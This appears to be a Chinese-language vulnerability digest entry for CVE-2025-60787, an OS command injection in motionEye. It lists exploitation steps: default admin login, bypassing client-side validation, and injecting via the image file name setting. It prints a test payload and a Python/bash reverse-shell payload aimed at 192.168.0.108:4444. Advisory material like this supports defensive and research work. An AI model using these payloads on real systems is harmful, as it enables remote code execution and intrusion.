## CVE-2025-60787-motionEye-OS命令注入

**漏洞编号:** CVE-2025-60787

**漏洞类型:** OS命令注入

**影响应用:** motionEye

**危害等级:** 高危，远程代码执行

**影响版本:** <= 0.43.1b4

**利用条件:** 需要管理员权限和网络访问，MotionEye服务运行中

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-60787 漏洞存在于motionEye <= 0.43.1b4版本中。该漏洞是由于对配置参数（例如 image_file_name）中用户输入未进行充分的清理和验证，导致OS命令注入。攻击者需要具备管理员权限，才能修改相关配置项。**利用方式如下：**

1.  **环境准备：** 运行motionEye Docker镜像。
2.  **版本验证：** 确认motionEye版本为0.43.1b4或更早。
3.  **登录：** 使用管理员账号登录motionEye Web界面（默认账号admin，密码为空）。
4.  **相机设置：** 添加一个RTSP网络摄像头（非必须，但方便触发漏洞）。
5.  **绕过客户端验证：** 通过浏览器控制台，覆盖`configUiValid`函数，使其始终返回`true`，从而绕过客户端的验证。
6.  **注入恶意命令：** 在“Still Images” > “Image File Name”配置项中，注入包含恶意命令的Payload，例如 `$(touch /tmp/test).%Y-%m-%d-%H-%M-%S`。
7.  **触发执行：** 应用配置，motionEye会在生成静态图像时执行注入的命令。可以通过查看/tmp/test文件是否存在来判断是否注入成功。如果需要反弹shell,需要使用类似$(python3 -c "import os;os.system('bash -c \"bash -i >& /dev/tcp/192.168.0.108/4444 0>&1\"')").%Y-%m-%d-%H-%M-%S的payload。

**关于投毒风险的分析：**

提供的POC代码主要用于验证漏洞的存在和利用方式，核心在于绕过客户端验证和构造恶意Payload。代码仓库本身并没有发现明显的恶意代码，例如后门或数据窃取。POC展示了如何反弹shell。代码仓库中可能存在细微的混淆或不明显的指令，但它们的目的更可能是为了增加分析难度，而不是植入恶意功能。但是依旧需要防范作者在其他分支或者commit版本中隐藏恶意代码的可能性，所以投毒风险为5%。

**项目地址:** [prabhatverma47/CVE-2025-60787](https://github.com/prabhatverma47/CVE-2025-60787)

**漏洞详情:** [CVE-2025-60787](https://nvd.nist.gov/vuln/detail/CVE-2025-60787)